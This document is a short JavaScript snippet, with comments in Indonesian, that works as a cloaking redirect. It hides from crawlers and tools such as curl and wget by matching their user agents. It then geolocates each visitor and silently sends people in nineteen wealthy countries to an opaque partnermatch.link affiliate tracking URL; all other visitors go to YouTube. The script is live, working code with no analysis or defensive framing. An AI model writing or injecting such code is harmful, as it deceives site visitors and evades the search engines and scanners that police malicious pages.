    <script>
        document.addEventListener('DOMContentLoaded', function() {
            function isBot() {
                var botPatterns = [
                    /bot/i,
                    /spider/i,
                    /crawl/i,
                    /curl/i,
                    /wget/i,
                    /http/i
                ];

                var userAgent = navigator.userAgent;

                return botPatterns.some(pattern => pattern.test(userAgent));
            }

            function redirectToSmartURL() {
                if (isBot()) {
                    console.log("Bot detected, no redirect will be performed.");
                    return;
                }

                fetch('https://ip-api.com/json/')
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        return response.json();
                    })
                    .then(data => {
                        console.log('Geolocation data:', data);
                        var country = data.countryCode;

                        // Definisikan URL berdasarkan negara
                        var targetUrl = "https://cdefecf.partnermatch.link/s/22edadef06445?track=LEGIT&subsource=TEVHSVQsQ1osMTg1LjI0Mi42LjUyLFdBUCxUUkFGRUU";
                        var youtubeUrl = "https://www.youtube.com";

                        // Daftar negara yang perlu diarahkan ke targetUrl
                        var redirectCountries = [
                            "AU", "AT", "BE", "CA", "DK", "FI", "FR", "DE", "IT",
                            "JP", "NL", "NZ", "NO", "PT", "ES", "SE", "CH", "GB", "US"
                        ];

                        // Redirect pengguna berdasarkan negara
                        if (redirectCountries.includes(country)) {
                            console.log(`Redirecting to ${targetUrl} for country: ${country}`);
                            window.location.href = targetUrl;
                        } else {
                            console.log(`Redirecting to ${youtubeUrl} for country: ${country}`);
                            window.location.href = youtubeUrl;
                        }
                    })
                    .catch(error => {
                        console.error('Error fetching geolocation data:', error);
                        window.location.href = "https://www.youtube.com";
                    });
            }

            redirectToSmartURL();
        });
    </script>
